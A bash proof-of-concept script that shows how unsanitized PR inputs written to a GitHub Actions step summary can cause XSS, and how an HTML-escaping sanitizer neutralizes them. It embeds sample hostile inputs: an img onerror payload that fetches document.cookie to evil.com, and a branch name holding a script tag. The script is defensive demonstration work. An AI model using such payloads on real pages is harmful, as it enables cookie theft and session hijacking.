#!/bin/bash
###############################################################
# Copyright (©) 2024-2025 David H Hoyt. All rights reserved.
###############################################################
#                 https://srd.cx
#
# Last Updated: 17-DEC-2025 1700Z by David Hoyt
#
# Intent: Try Sanitizing User Controllable Inputs
#
#
# 
#
# Comment: Sanitizing User Controllable Input 
#          - is a Moving Target
#          - needs ongoing updates
#          - needs additional unit tests
#
#
#
###############################################################
set -euo pipefail

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "╔════════════════════════════════════════════════════════════╗"
echo "║   XSS in GitHub Actions: Proof of Concept                 ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Simulate malicious input from PR
MALICIOUS_ACTOR='<img src=x onerror="fetch(`https://evil.com?cookie=${document.cookie}`)">'
MALICIOUS_BRANCH='feature/<script>alert(document.domain)</script>'

echo "Simulated hostile PR inputs:"
echo "  Actor:  $MALICIOUS_ACTOR"
echo "  Branch: $MALICIOUS_BRANCH"
echo ""

# Test 1: UNSAFE workflow (direct interpolation)
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "TEST 1: UNSAFE WORKFLOW (Direct Interpolation)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

UNSAFE_SUMMARY=$(mktemp)

echo "Workflow code:"
echo '```yaml'
echo 'run: |'
echo '  echo "## PR by ${{ github.actor }}" >> $GITHUB_STEP_SUMMARY'
echo '```'
echo ""

echo "Simulating direct interpolation..."
# This is what GitHub Actions does BEFORE running the shell
echo "## PR by $MALICIOUS_ACTOR" >> "$UNSAFE_SUMMARY"

echo "Generated GITHUB_STEP_SUMMARY contains:"
echo "─────────────────────────────────────────────────────────────"
cat "$UNSAFE_SUMMARY"
echo "─────────────────────────────────────────────────────────────"
echo ""

if grep -q '<img src' "$UNSAFE_SUMMARY"; then
  echo "🚨 VULNERABLE!"
  echo ""
  echo "   The file contains unescaped HTML:"
  grep -o '<img[^>]*>' "$UNSAFE_SUMMARY" || true
  echo ""
  echo "   When GitHub renders this as Markdown/HTML:"
  echo "   1. Browser parses the <img> tag"
  echo "   2. Image fails to load (src=x)"
  echo "   3. onerror handler executes JavaScript"
  echo "   4. Cookie is sent to evil.com"
  echo ""
  echo "   ⚠️  IMPACT: XSS allows attacker to:"
  echo "      • Steal session cookies"
  echo "      • Exfiltrate secrets from summary"
  echo "      • Perform actions as the viewer"
  echo "      • Deface the workflow UI"
fi

rm -f "$UNSAFE_SUMMARY"
echo ""

# Test 2: SAFE workflow (with sanitization)
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "TEST 2: SAFE WORKFLOW (With Sanitization)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Load sanitizer
if [ -r "$SCRIPT_DIR/sanitize.sh" ]; then
  # shellcheck disable=SC1091
  source "$SCRIPT_DIR/sanitize.sh"
else
  echo "ERROR: sanitize.sh not found" >&2
  exit 1
fi

SAFE_SUMMARY=$(mktemp)

echo "Workflow code:"
echo '```yaml'
echo 'env:'
echo '  ACTOR: ${{ github.actor }}'
echo 'run: |'
echo '  source base/.github/scripts/sanitize.sh'
echo '  safe_actor=$(sanitize_line "$ACTOR")'
echo '  echo "## PR by $safe_actor" >> $GITHUB_STEP_SUMMARY'
echo '```'
echo ""

echo "Simulating sanitization..."
safe_actor=$(sanitize_line "$MALICIOUS_ACTOR")
echo "## PR by $safe_actor" >> "$SAFE_SUMMARY"

echo "Generated GITHUB_STEP_SUMMARY contains:"
echo "─────────────────────────────────────────────────────────────"
cat "$SAFE_SUMMARY"
echo "─────────────────────────────────────────────────────────────"
echo ""

if grep -q '&lt;img' "$SAFE_SUMMARY"; then
  echo "✅ SECURE!"
  echo ""
  echo "   HTML entities are escaped:"
  echo "   • < becomes &lt;"
  echo "   • > becomes &gt;"
  echo "   • \" becomes &quot;"
  echo ""
  echo "   When GitHub renders this:"
  echo "   1. Browser sees HTML entities, not tags"
  echo "   2. Text is displayed, not interpreted as HTML"
  echo "   3. No JavaScript execution"
  echo "   4. User sees: <img src=x onerror=\"...\">"
  echo ""
  echo "   ✅ DEFENSE SUCCESS: Attack neutralized"
fi

rm -f "$SAFE_SUMMARY"
echo ""

# Visual comparison
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "SIDE-BY-SIDE COMPARISON"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

echo "INPUT:"
echo "  $MALICIOUS_ACTOR"
echo ""

echo "UNSAFE OUTPUT (Direct):"
echo "  ## PR by $MALICIOUS_ACTOR"
echo "  └─> Contains: <img src=x onerror=\"...\">"
echo "  └─> Result: 🚨 JavaScript executes"
echo ""

echo "SAFE OUTPUT (Sanitized):"
safe_display=$(sanitize_line "$MALICIOUS_ACTOR")
echo "  ## PR by $safe_display"
echo "  └─> Contains: &lt;img src=x onerror=&quot;...&quot;&gt;"
echo "  └─> Result: ✅ Displayed as text"
echo ""

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "CONCLUSION"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "The demonstration in demo_hostile_pr.sh is ACCURATE:"
echo ""
echo "  WITHOUT sanitization:"
echo "    ❌ User input written directly to GITHUB_STEP_SUMMARY"
echo "    ❌ GitHub UI renders it as HTML"
echo "    ❌ Malicious JavaScript executes"
echo "    ❌ XSS vulnerability"
echo ""
echo "  WITH sanitization (PatchIccMAX workflows):"
echo "    ✅ User input passed through sanitize_line()"
echo "    ✅ HTML entities properly escaped"
echo "    ✅ GitHub UI displays as text"
echo "    ✅ No XSS vulnerability"
echo ""
echo "PatchIccMAX workflows are SECURE ✅"
echo ""
